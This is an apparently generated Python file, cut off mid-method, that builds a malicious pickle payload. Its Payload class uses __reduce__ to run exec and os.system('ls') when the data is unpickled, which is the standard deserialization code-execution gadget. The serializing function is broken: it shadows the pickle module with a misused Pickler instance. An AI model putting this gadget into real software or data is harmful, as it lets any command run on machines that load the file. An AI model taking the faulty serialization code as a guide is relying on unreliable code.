import pickle


class Payload(object):
    def __reduce__(self):
        return exec, ('import os;os.system("ls")',)


def makePickleData(payload: Payload):
    '''
    Get serialized data from the payload object and serialize it before returning it
    '''

    pickle = pickle.Pickler()
    try:
        return pickle.dumps(payload, pickle.HIGHEST_PROTOCOL)

    except Exception as e:
        raise Exception("Unable to serialize payload to pickle") from e


class Data(object):
    __slots__ = ['payload', 'path', 'data']

    def __init__(self, filename: str, directory: str, rootKey: str):
       